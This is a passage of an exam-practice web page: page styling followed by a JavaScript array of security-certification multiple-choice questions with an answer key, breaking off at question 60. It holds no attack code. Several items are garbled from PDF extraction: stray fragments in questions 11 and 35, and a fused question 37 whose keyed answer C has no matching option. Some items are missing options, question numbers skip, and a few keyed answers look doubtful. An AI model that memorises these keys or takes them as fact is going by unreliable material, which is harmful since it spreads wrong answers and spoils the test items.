:root{--navy:#0A5F91;--deep:#10293B;--gold:#F5BD2D;--navy-t:#E8F1F8;--gold-t:#FEF6E0;--ink:#1F2933;--muted:#5B6B79;--line:#D9E2EA;--ok:#1E8E5A;--ok-t:#E5F5EC;--bad:#C0392B;--bad-t:#FBEAEA}
*{box-sizing:border-box}
body{margin:0;font-family:"Cairo",Tahoma,"Segoe UI",Arial,sans-serif;background:#F3F6F9;color:var(--ink);font-size:16px}
header.top{background:var(--deep);color:#fff;border-bottom:4px solid var(--gold);display:flex;align-items:center;gap:14px;padding:10px 18px;position:sticky;top:0;z-index:5}
.logo-card{background:#fff;border-radius:10px;padding:4px 8px;display:flex}.logo-card img{height:34px}
header .ttl{font-weight:800;font-size:17px;flex:1}header .ttl small{display:block;font-weight:400;font-size:12px;opacity:.85}
.timer{background:var(--navy);border:2px solid var(--gold);border-radius:10px;padding:4px 14px;font-weight:800;font-size:20px;direction:ltr;min-width:120px;text-align:center}
.timer.low{background:var(--bad)}
main{max-width:1150px;margin:18px auto;padding:0 14px}
.card{background:#fff;border-radius:16px;box-shadow:0 2px 10px rgba(16,41,59,.08);padding:22px;margin-bottom:16px;position:relative;overflow:hidden}
.card:before{content:"";position:absolute;top:0;right:0;left:0;height:6px;background:linear-gradient(90deg,var(--gold) 0 30%,var(--navy) 30%)}
h1{color:var(--deep);font-size:28px;margin:6px 0}h2{color:var(--navy);font-size:22px;margin:4px 0 10px}
.notice{background:var(--gold-t);border-right:6px solid var(--gold);padding:12px 16px;border-radius:10px;font-weight:700;margin:12px 0}
.btn{font-family:inherit;font-size:16px;font-weight:700;border:0;border-radius:10px;padding:10px 20px;cursor:pointer;background:var(--navy);color:#fff}
.btn:hover{filter:brightness(1.1)}.btn.gold{background:var(--gold);color:var(--deep)}.btn.ghost{background:#fff;color:var(--navy);border:2px solid var(--navy)}
.btn:disabled{opacity:.4;cursor:not-allowed}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:14px}
.exam-tile{border:2px solid var(--line);border-radius:14px;padding:16px}.exam-tile h3{margin:0 0 6px;color:var(--deep)}
table.info{border-collapse:collapse;width:100%}table.info td{padding:7px 10px;border-bottom:1px solid var(--line)}table.info td:first-child{font-weight:700;color:var(--navy);width:40%}
ul.rules li{margin:5px 0}
.layout{display:grid;grid-template-columns:1fr 250px;gap:16px}
@media(max-width:850px){.layout{grid-template-columns:1fr}}
.qhead{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:10px}
.pill{background:var(--navy-t);color:var(--navy);border-radius:999px;padding:3px 12px;font-weight:700;font-size:14px}
.pill.gold{background:var(--gold-t);color:#8a6200}
.qtext{direction:ltr;text-align:left;font-family:"Segoe UI",Arial,"Cairo",sans-serif;line-height:1.6;font-size:16px}
.qtext p{margin:0 0 10px}.qtext p.ask{font-weight:700}
details.case{background:#F7FAFC;border:1px solid var(--line);border-radius:10px;padding:8px 12px;margin-bottom:12px;direction:rtl}
details.case summary{cursor:pointer;font-weight:700;color:var(--navy)}
details.case .qtext{max-height:340px;overflow:auto;margin-top:8px;font-size:15px;color:#33414d}
.exhibit{margin:10px 0;text-align:center}.exhibit img{max-width:100%;border:1px solid var(--line);border-radius:8px;cursor:zoom-in}
.choose{direction:rtl;font-weight:800;color:var(--bad);margin:6px 0}
.opt{display:flex;gap:10px;align-items:flex-start;border:2px solid var(--line);border-radius:10px;padding:10px 12px;margin:8px 0;cursor:pointer;direction:ltr;text-align:left;font-family:"Segoe UI",Arial,"Cairo",sans-serif}
.opt:hover{border-color:var(--navy)}.opt.sel{border-color:var(--navy);background:var(--navy-t)}
.opt .k{font-weight:800;color:var(--navy);min-width:22px}
.opt input{margin-top:5px}
.opt.correct{border-color:var(--ok);background:var(--ok-t)}.opt.wrong{border-color:var(--bad);background:var(--bad-t)}
.opt .tag{margin-left:auto;font-family:"Cairo";font-size:13px;font-weight:700;white-space:nowrap}
.navrow{display:flex;gap:10px;justify-content:space-between;flex-wrap:wrap;margin-top:14px}
.nav h4{margin:0 0 8px;color:var(--deep)}
.navgrid{display:grid;grid-template-columns:repeat(5,1fr);gap:6px;direction:ltr}
.nb{font-family:inherit;border:1px solid var(--line);background:#fff;border-radius:6px;padding:6px 0;cursor:pointer;font-weight:700;position:relative}
.nb.ans{background:var(--navy);color:#fff}.nb.cur{outline:3px solid var(--gold)}.nb.flag:after{content:"⚑";position:absolute;top:-6px;right:-3px;color:var(--bad);font-size:13px}
.nb.locked{opacity:.35;cursor:not-allowed}
.legend{font-size:12px;color:var(--muted);margin-top:8px}
.flagbtn.on{background:var(--bad);color:#fff;border-color:var(--bad)}
.revlist{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px}
.revitem{border:1px solid var(--line);border-radius:8px;padding:8px;cursor:pointer}.revitem.un{border-color:var(--bad);background:var(--bad-t)}.revitem.fl{border-color:var(--gold);background:var(--gold-t)}
.score{font-size:48px;font-weight:800;color:var(--navy)}
.bar{height:16px;background:var(--line);border-radius:999px;overflow:hidden;position:relative;direction:ltr}.bar i{display:block;height:100%;background:var(--navy)}.bar b{position:absolute;top:-4px;bottom:-4px;width:3px;background:var(--gold)}
.pass{padding:10px 14px;border-radius:10px;font-weight:700}.pass.ok{background:var(--ok-t);color:var(--ok)}.pass.no{background:var(--bad-t);color:var(--bad)}
.filters{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0}.filters .btn{padding:6px 14px}.filters .btn.act{background:var(--gold);color:var(--deep)}
.rq{border-right:6px solid var(--ok)}.rq.bad{border-right-color:var(--bad)}
.exp{background:#F7FAFC;border-radius:8px;padding:10px;margin-top:8px}
.big{font-size:56px;font-weight:800;color:var(--navy);direction:ltr}
.hidden{display:none}
#zoom{position:fixed;inset:0;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;z-index:50;cursor:zoom-out}#zoom img{max-width:96vw;max-height:94vh}
footer{text-align:center;color:var(--muted);font-size:12px;padding:16px}
</style>
<style>/* ABAD: back link (hidden while exam timer runs) */.abad-back{background:var(--gold);color:#10293b;font-weight:700;font-size:13px;padding:6px 14px;border-radius:999px;text-decoration:none;white-space:nowrap}.timer:not(.hidden)~.abad-back{display:none}@media(max-width:520px){.abad-back{font-size:12px;padding:5px 10px}}</style>
<style id="sp-hero-css">/* ITIL-style welcome (shared design) */
.sp-hero{text-align:center;padding:0!important}.sp-hero:before{display:none}
.sp-hero .band{height:8px;background:linear-gradient(90deg,var(--gold) 0 33%,var(--navy) 33% 100%)}
.sp-hero .body{padding:34px 34px 30px}
.sp-hero .logo-row{display:flex;justify-content:center;align-items:center;gap:22px;flex-wrap:wrap;margin-bottom:10px}
.sp-hero .logo-big{display:inline-block;background:#fff;border:1px solid var(--line);border-radius:18px;padding:14px 22px}
.sp-hero .logo-big img{height:86px;display:block}.sp-hero .logo-big.vend img{height:86px}
.sp-hero .sep{width:2px;height:70px;background:var(--line);border-radius:2px}
.sp-hero .greet{color:var(--navy);font-weight:800;font-size:21px;margin:4px 0 2px}
.sp-hero h1{margin:6px 0 0;font-size:40px;line-height:1.35;color:var(--deep);font-weight:900}
.sp-hero .en-title{font-size:19px;color:#b8860b;font-weight:800;margin:2px 0 18px;direction:ltr}
.sp-hero .facts{display:flex;flex-wrap:wrap;justify-content:center;gap:12px;margin:8px 0 22px}
.sp-hero .fact{background:var(--navy-t);border-radius:14px;padding:10px 18px;min-width:130px}
.sp-hero .fact b{display:block;font-size:26px;color:var(--navy);line-height:1.2;font-weight:900}
.sp-hero .fact span{font-size:13.5px;color:var(--muted);font-weight:600}
.sp-hero .fact.gold{background:var(--gold-t)}.sp-hero .fact.gold b{color:#b8860b}
.sp-hero .notice{background:var(--gold-t);border:1px solid #F3D27A;border-right:6px solid var(--gold);border-radius:12px;padding:12px 18px;text-align:start;font-size:14.5px;font-weight:400;color:#4d3f12;margin:0 0 20px;line-height:1.8}
.sp-hero .notice b{color:var(--deep)}
.sp-hero .en{display:block;font-size:12.5px;font-weight:600;opacity:.9;direction:ltr;text-align:left;unicode-bidi:isolate;margin-top:4px}
.sp-hero .en.in{display:inline;font-size:.72em;margin-inline-start:6px}
.sp-hero .welcome-rules{text-align:start;margin:0 0 22px}
.sp-hero .welcome-rules h3{margin:0 0 12px;color:var(--deep);font-size:20px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.sp-hero .welcome-rules h3::before{content:"";width:6px;height:22px;background:var(--gold);border-radius:3px}
.sp-hero ul.rules{list-style:none;margin:0;padding:0;display:grid;gap:10px;grid-template-columns:1fr 1fr}
.sp-hero ul.rules li{display:flex;gap:12px;align-items:flex-start;background:#F8FAFC;border:1px solid #E6EDF3;border-radius:12px;padding:10px 14px;margin:0}
.sp-hero .rules .ic{flex:0 0 38px;height:38px;border-radius:10px;background:var(--navy-t);color:var(--navy);display:grid;place-items:center;font-weight:900;font-size:15px}
.sp-hero .rules li.k .ic{background:var(--gold-t);color:#b8860b}
.sp-hero .rules b{color:var(--deep)}
.sp-hero .rules small{display:block;color:var(--muted);font-size:13.5px;line-height:1.6}
.sp-hero .rules small.e{direction:ltr;text-align:left;unicode-bidi:isolate}
.sp-hero .src{font-size:13px;color:var(--muted);text-align:start;margin:0 0 18px}
.sp-hero .btn-xl{font-size:22px;padding:14px 64px;min-height:62px;border-radius:16px}
@media (max-width:760px){.sp-hero ul.rules{grid-template-columns:1fr}.sp-hero .body{padding:22px 16px}.sp-hero h1{font-size:31px}.sp-hero .en-title{font-size:15.5px}.sp-hero .logo-big img,.sp-hero .logo-big.vend img{height:62px}.sp-hero .fact{min-width:0;flex:1 1 40%;padding:8px 10px}.sp-hero .fact b{font-size:22px}}

const QS=[{"n": 1, "stem": ["Which of the following agreement types defines the time frame in which a vendor needs to respond?"], "opts": [{"k": "A", "t": "sow"}, {"k": "B", "t": "SLA"}, {"k": "C", "t": "MOA"}, {"k": "D", "t": "MOU"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 2, "stem": ["Which of the following documents describes a step-by-step process for a specific task?"], "opts": [{"k": "A", "t": "Playbook"}, {"k": "B", "t": "Policy"}, {"k": "C", "t": "Plan"}, {"k": "D", "t": "Procedure"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 3, "stem": ["A systems administrator is concerned about vulnerabilities within cloud computing instances. Which of the following is most important for the administrator to consider when architecting a cloud computing environment?"], "opts": [{"k": "A", "t": "SQL injection"}, {"k": "B", "t": "TOC/TOU"}, {"k": "C", "t": "VM escape"}, {"k": "D", "t": "Tokenization"}, {"k": "E", "t": "Password spraying"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 4, "stem": ["Which of the following best evaluates the effectiveness of the recovery process and a team's response when mimicking a natural disaster?"], "opts": [{"k": "A", "t": "Simulation test"}, {"k": "B", "t": "Contingency planning"}, {"k": "C", "t": "Parallel processing"}, {"k": "D", "t": "Tabletop exercise"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 5, "stem": ["A security team at a large, global company needs to reduce the cost of storing data used for performing investigations. Which of the following types of data should have its retention length reduced?"], "opts": [{"k": "A", "t": "Packet capture"}, {"k": "B", "t": "Endpoint logs"}, {"k": "C", "t": "OS security logs"}, {"k": "D", "t": "Vulnerability scan"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 6, "stem": ["A company conducts an assessment. Analysts notice that employees frequently leave sensitive physical documents on their desks without supervision. On which of the following concepts should the company train its employees?"], "opts": [{"k": "A", "t": "Operational security"}, {"k": "B", "t": "Removable media"}, {"k": "C", "t": "Social engineering"}, {"k": "D", "t": "Insider threat"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 7, "stem": ["A systems administrator configures a VPN setting using the following algorithms: • DES • IKEv1 Which of the following vulnerabilities would this create?"], "opts": [{"k": "A", "t": "OS-based"}, {"k": "B", "t": "Web-based"}, {"k": "C", "t": "Cryptographic"}, {"k": "D", "t": "Hashing"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 8, "stem": ["A security operation team detects multiple unsuccessful login attempts on a jump server used by remote workers. Which of the following options could be deployed to best mitigate these attacks?"], "opts": [{"k": "A", "t": "VPN"}, {"k": "B", "t": "IDS"}, {"k": "C", "t": "WAF"}, {"k": "D", "t": "SD-WAN"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 9, "stem": ["A company has a primary web server and a standby backup. The company wants to immediately increase the servers' ability to handle higher traffic volumes. Which of the following methods is the simplest way to meet this objective?"], "opts": [{"k": "A", "t": "Automated fail over"}, {"k": "B", "t": "Load balancing"}, {"k": "C", "t": "Clustering"}, {"k": "D", "t": "Containers"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 10, "stem": ["A user installs unofficial software on their mobile device. A security analyst discovers a backdoor on the mobile device as a result. Which of the following best categorizes this vulnerability?"], "opts": [{"k": "A", "t": "Malicious update"}, {"k": "B", "t": "Time-of-use"}, {"k": "C", "t": "Sideloading"}, {"k": "D", "t": "Memory injection"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 11, "stem": ["A. Honeypot security analyst created a fake account and saved the password in a non-readily accessible directory in a spreadsheet. An alert was also configured to notify the security team if the spreadsheet is opened. Which of the following best describes the deception method being deployed?"], "opts": [{"k": "A", "t": "Honeypot"}, {"k": "B", "t": "Honey account"}, {"k": "C", "t": "Honeytoken"}, {"k": "D", "t": "Honeynet"}], "ans": ["C"], "exp": "", "src": "PDF", "note": "Source defect kept verbatim: question text begins with a stray \"A.\"/option fragment in the PDF."}, {"n": 12, "stem": ["Which of the following automation and orchestration use cases ensures that all directory servers are hardened before they move to the production environment?"], "opts": [{"k": "A", "t": "Resource provisioning"}, {"k": "B", "t": "Identity provisioning"}, {"k": "C", "t": "Service provisioning"}, {"k": "D", "t": "User provisioning"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 13, "stem": ["Which of the following is the first step to take before deploying a major upgrade to a highly available server?"], "opts": [{"k": "A", "t": "Business continuity planning"}, {"k": "B", "t": "Independent assessment"}, {"k": "C", "t": "Due diligence"}, {"k": "D", "t": "Change management request"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 14, "stem": ["A SIEM alert is created to detect anyone trying to use emergency access accounts for unauthorized actions. Which of the following types of malicious actors is this alert supposed to detect?"], "opts": [{"k": "A", "t": "Shadow IT"}, {"k": "B", "t": "Unskilled attacker"}, {"k": "C", "t": "Hacktivist"}, {"k": "D", "t": "Insider threat"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 15, "stem": ["An organization wants to prevent an outdated and vulnerable system from connecting to internal resources until the system can be brought up to the baseline configuration. Which of the following will best help the organization reach this goal?"], "opts": [{"k": "A", "t": "Penetration testing"}, {"k": "B", "t": "Quarantining"}, {"k": "C", "t": "Vulnerability scanners"}, {"k": "D", "t": "Benchmarks"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 16, "stem": ["Which of the following security control types indicates the use of application firewalls and network firewalls?"], "opts": [{"k": "A", "t": "Deterrent"}, {"k": "B", "t": "Preventive"}, {"k": "C", "t": "Administrative"}, {"k": "D", "t": "Physical"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 17, "stem": ["Which of the following would allow employees to exfiltrate sensitive files when their workstations are not connected to the internet? (Select two)."], "opts": [{"k": "A", "t": "Connecting to a mobile phone hotspot"}, {"k": "B", "t": "Utilizing an email attachment feature"}, {"k": "C", "t": "Using a removable device"}, {"k": "D", "t": "Installing an FTP server to send files to remote systems"}, {"k": "E", "t": "Cloning an encrypted hard disk"}, {"k": "F", "t": "Opening port 53 on the host firewall"}], "ans": ["A", "C"], "exp": "", "src": "PDF"}, {"n": 18, "stem": ["Security controls in a data centre are being reviewed to ensure data is properly protected and that human life considerations are included. Which of the following best describes how the controls should be set up?"], "opts": [{"k": "A", "t": "Remote access points should fail closed."}, {"k": "B", "t": "Logging controls should fail open."}, {"k": "C", "t": "Safety controls should fail open."}, {"k": "D", "t": "Logical security controls should fail closed."}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 19, "stem": ["Which of the following best explains why an organization would choose a warm site for disaster recovery?"], "opts": [{"k": "A", "t": "It reduces complexity by replicating data in real time across identical environments."}, {"k": "B", "t": "It eliminates the need for backup testing by using cloud-native infrastructure."}, {"k": "C", "t": "It offers fully automated fail over with no manual intervention required."}, {"k": "D", "t": "It balances cost and recovery time by maintaining partially configured systems."}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 20, "stem": ["A security analyst reviews logs and finds a large number of malicious requests that have caused performance issues on the company's site. Which of the following would have most likely prevented this attack?"], "opts": [{"k": "A", "t": "IPSec"}, {"k": "B", "t": "TLS"}, {"k": "C", "t": "SDN"}, {"k": "D", "t": "WAF"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 21, "stem": ["A popular, third-party cryptographic library receives a security advisory. A company's security manager directs the security team to determine if their new human resources application contains the affected library. Which of the following should the security team use?"], "opts": [{"k": "A", "t": "Root cause analysis"}, {"k": "B", "t": "Dynamic analysis scan"}, {"k": "C", "t": "Software composition analysis"}, {"k": "D", "t": "Penetration test"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 22, "stem": ["A company established a secure tunnel between two physical company sites. The company took this action to comply with contractual and regulatory obligations to a client to secure customer data at each stage of processing. The secure tunnel complements the current database encryption process. Which of the following actions should be taken next?"], "opts": [{"k": "A", "t": "Add a failover database server."}, {"k": "B", "t": "Increase the data backups to full backups twice a week."}, {"k": "C", "t": "Implement an enclave to encrypt volatile data."}, {"k": "D", "t": "Place an IDS device at the ingress points of the two sites."}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 23, "stem": ["Which of the following is the most appropriate reason for a server technician to disable unused ports and services on an externally facing DNS server?"], "opts": [{"k": "A", "t": "To reduce the need for patching"}, {"k": "B", "t": "To block ports not currently blocked by the network firewall"}, {"k": "C", "t": "To conserve system memory"}, {"k": "D", "t": "To limit the attack surface area"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 24, "stem": ["A company implements an authentication mechanism using certificates on smart cards. However, former employees are able to use the smart cards to authenticate and gain access to company resources. Which of the following should the company implement to prevent unauthorized access?"], "opts": [{"k": "A", "t": "CA"}, {"k": "B", "t": "TPM"}, {"k": "C", "t": "CRL"}, {"k": "D", "t": "CSR"}, {"k": "E", "t": "HSM"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 25, "stem": ["Which of the following would an attacker exploit by using externally injected script that leads to full control of a web browser?"], "opts": [{"k": "A", "t": "XSS"}, {"k": "B", "t": "SWG"}, {"k": "C", "t": "DoS"}, {"k": "D", "t": "SQLi"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 26, "stem": ["Which of the following activities must take place in order to detect vulnerabilities in source code during software deployment?"], "opts": [{"k": "A", "t": "Static analysis"}, {"k": "B", "t": "Penetration testing"}, {"k": "C", "t": "Bug bounty"}, {"k": "D", "t": "Dynamic testing"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 27, "stem": ["Which of the following activities should be included as part of passive reconnaissance in a penetration test?"], "opts": [{"k": "A", "t": "Domain Name System (DNS) zone transfer"}, {"k": "B", "t": "Vulnerability scanning"}, {"k": "C", "t": "Social engineering"}, {"k": "D", "t": "Google hacking"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 28, "stem": ["Which of the following principles ensures data is only accessible to authorized users?"], "opts": [{"k": "A", "t": "Integrity"}, {"k": "B", "t": "Confidentiality"}, {"k": "C", "t": "Non-repudiation"}, {"k": "D", "t": "Availability"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 29, "stem": ["Which of the following is a security consideration when disposing of IT assets?"], "opts": [{"k": "A", "t": "There may be legal requirements for data retention."}, {"k": "B", "t": "Data ownership should be reassigned before decommissioning mobile devices."}, {"k": "C", "t": "Devices can be declassified once the asset is taken out of inventory."}, {"k": "D", "t": "Hashing should be performed before the device is destroyed."}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 30, "stem": ["Which of the following best explains how tokenization helps protect sensitive data?"], "opts": [{"k": "A", "t": "It permanently deletes sensitive information from production systems."}, {"k": "B", "t": "It replaces the original data with reference values that do not hold exploitable meaning."}, {"k": "C", "t": "It stores sensitive data across multiple cloud environments to prevent data loss."}, {"k": "D", "t": "It conceals data by converting it into unreadable cipher text using symmetric encryption."}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 31, "stem": ["An increasing number of employees are unable to identify social engineering incidents. Which of the following should the company do to best address this issue?"], "opts": [{"k": "A", "t": "Update company policies."}, {"k": "B", "t": "Implement corrective action."}, {"k": "C", "t": "Notify stakeholders."}, {"k": "D", "t": "Perform simulations."}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 32, "stem": ["An employee is added to a view-only user group. The employee accidentally receives administrative access. Which of the following is the most likely reason for this error?"], "opts": [{"k": "A", "t": "Impersonation"}, {"k": "B", "t": "Privilege creep"}, {"k": "C", "t": "Permission inheritance"}, {"k": "D", "t": "Misconfiguration"}], "ans": ["D"], "exp": "", "src": "PDF", "note": "Source layout: question text was printed beside the options in the PDF; text unchanged."}, {"n": 33, "stem": ["A security administrator notices employees leave sticky notes on their desks with keys and secrets written down. Which of the following training topics best addresses this behaviour?"], "opts": [{"k": "A", "t": "Situational awareness"}, {"k": "B", "t": "Operational security"}, {"k": "C", "t": "Social engineering"}, {"k": "D", "t": "Credential management"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 34, "stem": ["Which of the following best explains the concept of a watering hole attack?"], "opts": [{"k": "A", "t": "It poisons DNS servers to redirect users to malicious websites."}, {"k": "B", "t": "It exploits software services used by potential targets."}, {"k": "C", "t": "It replaces legitimate software with malicious software during a patch update."}, {"k": "D", "t": "It uses a compromised website to target a specific group."}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 35, "stem": ["A group of attackers launches a DDoS attack against a financial institution. This attack takes down the institution's public website and online banking services for several hours. The group does not steal any data or demand a ransom Which of the following motivations is most likely behind this attack?"], "opts": [{"k": "A", "t": "Financial gain"}, {"k": "B", "t": "Service disruption"}, {"k": "C", "t": "Data exfiltration"}, {"k": "D", "t": "The fc with F Corporate espionage"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 36, "stem": ["A company's threat intelligence team receives reports of a sophisticated attacker using a new technique to exfiltrate files from end-user workstations unnoticed. Which of the following should the incident response team update to better monitor the attack?"], "opts": [{"k": "A", "t": "DNS filtering"}, {"k": "B", "t": "UBA"}, {"k": "C", "t": "EDR agent"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 37, "stem": ["A Chief Information Security Officer (CISO) performs user training by using targeted emails that mimic a trusted vendor. Users that click on the embedded link are taken to a website to learn more this type of attack pattern Which of the following best describes what the CISO IS trying to teach?"], "opts": [{"k": "A", "t": "How to report insider threats"}, {"k": "B", "t": "How ation logs to review database query execution timestamps"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 42, "stem": ["A security team deployed a DLP system on the network, but they continue to discover instances of exfiltration through other methods. In most cases an insider threat is the root cause of the exfiltration Most recently a departing employee removed a large quantity of files because the DLP system was configured to ignore very large ZIP files for performance reasons Which of the following solutions would augment the DLP system to stop or detect exfiltration'?"], "opts": [{"k": "A", "t": "Role-based access control"}, {"k": "B", "t": "EDR"}, {"k": "C", "t": "AM"}, {"k": "D", "t": "User behaviour analytics"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 43, "stem": ["Which of the following principles includes the physical or logical tagging and tracking of devices and equipment?"], "opts": [{"k": "A", "t": "Asset classification"}, {"k": "B", "t": "Asset inventory"}, {"k": "C", "t": "Asset certification"}, {"k": "D", "t": "Asset authorization"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 44, "stem": ["An organization wants to implement an SSO solution that will fulfill the following requirements •Must not restrict the organization to a single vendor •Must facilitate federated identity management •Must not require continuous user account synchronization across network directones Which of the following technologies should be part of the solution\"?"], "opts": [{"k": "A", "t": "SAML"}, {"k": "B", "t": "OAuth"}, {"k": "C", "t": "Open lD Connect"}, {"k": "D", "t": "LDAP"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 45, "stem": ["A network team is investigating failures to onboard users to a Wi-Fi network. The investigation shows that the access point accepts connections for a short time after a restart. The security administrator inspecting the connections has logs that show a large increase in suspicious to the access point- Replacing the device with a higher capacity access point does not resolve the issue. Which of the following attacks is most likely occurring?"], "opts": [{"k": "A", "t": "On-path"}, {"k": "B", "t": "DNS spoofing"}, {"k": "C", "t": "Evil twin"}, {"k": "D", "t": "DoS"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 46, "stem": ["Which of the following is the most likely reason a bank would implement a change freeze on critical systems during a major holiday?"], "opts": [{"k": "A", "t": "To enable staff to take holidays and reduce annual leave"}, {"k": "B", "t": "To deal with the heightened attack level during busy periods"}, {"k": "C", "t": "To manage the reduced support levels available from third parties"}, {"k": "D", "t": "To reduce the chance of outages that would impact Customers"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 47, "stem": ["Visitors to a company’s facilities are connecting to the company's (nrporate network Wi-Fi and open network ports. Which of the following should the security engineer implement to prevent this unauthorized access?"], "opts": [{"k": "A", "t": "WPA3"}, {"k": "B", "t": "NAC"}, {"k": "C", "t": "HIDS"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 48, "stem": ["Which of the following would be best suited for constantly changing environments?"], "opts": [{"k": "A", "t": "RTOS"}, {"k": "B", "t": "Containers"}, {"k": "C", "t": "Embedded systems"}, {"k": "D", "t": "SCADA"}], "ans": ["B"], "exp": "", "src": "PDF", "note": "Source layout: question text was printed beside the options in the PDF; text unchanged."}, {"n": 49, "stem": ["An administrator learns that users are receiving large quantities of unsolicited messages. The administrator checks the content filter and sees hundreds of messages sent to multiple users. Which of the following best describes this kind of attack?"], "opts": [{"k": "A", "t": "Watering hole"}, {"k": "B", "t": "Typo squatting"}, {"k": "C", "t": "Business email compromise"}, {"k": "D", "t": "Phishing"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 50, "stem": ["A security analyst must recover files from a USB drive associated with a ransomware attack. Which of the following tools will help the analyst securely retrieve the files?"], "opts": [{"k": "A", "t": "Sandboxing environment"}, {"k": "B", "t": "Intrusion prevention system"}, {"k": "C", "t": "File integrity management tool"}, {"k": "D", "t": "Static code analysis tool"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 51, "stem": ["An administrator finds that all user workstations and servers are displaying a message that is associated with files containing an extension of risk. Which of the following types of infections is present on the systems?"], "opts": [{"k": "A", "t": "Virus"}, {"k": "B", "t": "Trojan"}, {"k": "C", "t": "Spyware"}, {"k": "D", "t": "Ransomware"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 52, "stem": ["A company needs to provide administrative access to internal resources while minimizing the traffic allowed through the security boundary Which of the following methods is most secure?"], "opts": [{"k": "A", "t": "Implementing a bastion host"}, {"k": "B", "t": "Deploying a perimeter network"}, {"k": "C", "t": "Installing a WAF"}, {"k": "D", "t": "Utilizing single sign-on"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 53, "stem": ["Which of the following reduces oversight and places the most trust in the implementing organization?"], "opts": [{"k": "A", "t": "Self-attestation"}, {"k": "B", "t": "Third-party assessment"}, {"k": "C", "t": "Red team exercise"}, {"k": "D", "t": "Vulnerability report"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 54, "stem": ["server An engineer needs to find a solution that creates an added layer of security by preventing unauthorized access to internal company resources. Which of the following would be the best solution?"], "opts": [{"k": "A", "t": "RDP"}, {"k": "B", "t": "Jump server"}, {"k": "C", "t": "Proxy server"}, {"k": "D", "t": "Hypervisor"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 55, "stem": ["A customer reports that software the customer downloaded from a public website has malware in it. However, the company that created the software denies any malware in its software at delivery time. Which of the following techniques will address this concern?"], "opts": [{"k": "A", "t": "Secure storage"}, {"k": "B", "t": "Static code analysis"}, {"k": "C", "t": "Input validation"}, {"k": "D", "t": "Code signing"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 56, "stem": ["Which of the following threat actors will most likely target an organization by using a logic bomb within an internally-developed application?"], "opts": [{"k": "A", "t": "Nation-state"}, {"k": "B", "t": "Trusted insider"}, {"k": "C", "t": "Organized crime group"}, {"k": "D", "t": "Hacktivist"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 57, "stem": ["Employees in the research and development business unit receive extensive training to ensure they understand how to best protect company data. Which of the following is the type of data these employees are most likely to use in day-to-day work activities?"], "opts": [{"k": "A", "t": "Encrypted"}, {"k": "B", "t": "Intellectual property"}, {"k": "C", "t": "Critical"}, {"k": "D", "t": "Data in transit"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 58, "stem": ["systems administrator is creating a script that would save time and prevent human error when performing account creation for a large number of end users. Which of the following would be a good use case for this task?"], "opts": [{"k": "A", "t": "Off-the-shelf software"}, {"k": "B", "t": "Orchestration"}, {"k": "C", "t": "Baseline"}, {"k": "D", "t": "Policy enforcement"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 59, "stem": ["A security analyst hardens a web application server. The analyst wants to ensure that an attacker cannot bind to arbitrary network ports or read system configuration if the web server is compromised. Which of the following security controls will achieve the analyst's goals?"], "opts": [{"k": "A", "t": "Configure firewall to block all unnecessary network traffic on the server."}, {"k": "B", "t": "Use SE Linux to apply predefined security policies to processes and files."}, {"k": "C", "t": "Utilize a SIEM to monitor the server for suspicious user activity."}, {"k": "D", "t": "Implement strict sudo configurations to lock down privileged commands."}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 60, "stem": ["An external security assessment report indicates a high click rate on suspicious emails. The 